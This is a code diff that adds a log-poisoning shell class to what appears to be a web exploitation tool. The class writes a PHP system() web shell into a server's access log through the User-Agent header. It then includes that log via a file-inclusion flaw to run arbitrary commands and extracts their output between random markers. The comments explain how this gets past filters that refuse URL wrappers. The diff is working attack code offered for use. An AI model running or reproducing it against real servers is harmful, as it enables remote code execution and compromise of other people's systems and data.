@@ -20,6 +20,7 @@ import secrets
 from urllib.parse import quote, urlsplit, urlunsplit
 
 from ...core.filters import php_runner
+from ...core.httpmsg import Request
 from ...core.params import Encode, rewrite
 from ...engine.inject import inject
 
@@ -106,3 +107,67 @@ class FilterChainShell:
                 cut = position
                 break
         return tail[:cut].strip()
+
+
+class LogPoisonShell:
+    """A command runner that lives in a file the target writes for itself.
+
+    An include() point is enough to run code when any file the application writes
+    can be named. The access log is the one that always exists and always holds
+    what the caller sent: nginx and apache both record the User-Agent verbatim,
+    so one request whose agent is PHP source leaves that source sitting in a file
+    the very same include() will execute.
+
+    This is the route that works when every wrapper is refused. An application
+    that accepts nothing containing `://` still hands a plain path to include(),
+    and the log path is a plain path.
+    """
+
+    def __init__(self, ctx, param, log_path: str, aux: str = AUX_PARAM, action: str = "os-shell") -> None:
+        self.ctx = ctx
+        self.param = param
+        self.log_path = log_path
+        self.aux = aux
+        self.action = action
+        self._planted = False
+
+    def __call__(self, command: str) -> str:
+        if not self._planted:
+            self._plant()
+
+        # The whole log is included, so every earlier request - other people's
+        # traffic and this run's own attempts - is parsed as PHP on the way to
+        # the answer, and the command's output ends up somewhere in a wall of
+        # text rather than at the start. A marker pair per command is what makes
+        # it findable; it is fresh each time so an older run's markers, still in
+        # the log, cannot be mistaken for this one's.
+        start = "ik" + secrets.token_hex(5)
+        end = "ik" + secrets.token_hex(5)
+        payload = f"echo {start};{command};echo {end}"
+
+        exchange = self.ctx.send(self._request(payload), action=self.action)
+        body = exchange.response.text
+        head = body.rfind(start)
+        tail = body.rfind(end)
+        if head == -1 or tail <= head:
+            return (
+                "the injected command did not run: the marker never came back. "
+                "The log may not be includable, or it may be truncated before "
+                "reaching the line this request wrote"
+            )
+        return body[head + len(start):tail].strip() or "the command printed nothing"
+
+    def _plant(self) -> None:
+        """Leave PHP source in the log, in the one place a server records verbatim."""
+        request = self.ctx.config["request"].clone()
+        request.headers.set("User-Agent", f'<?php system($_GET["{self.aux}"]); ?>')
+        self.ctx.send(request, action=f"{self.action}.plant")
+        self._planted = True
+
+    def _request(self, command: str) -> Request:
+        """The include that runs the planted source, with the command beside it."""
+        request = rewrite(self.ctx.config["request"], self.param, self.log_path, Encode.URL).clone()
+        parts = urlsplit(request.url)
+        query = parts.query + ("" if not parts.query else "&") + f"{self.aux}={quote(command, safe='')}"
+        request.url = urlunsplit((parts.scheme, parts.netloc, parts.path, query, parts.fragment))
+        return request
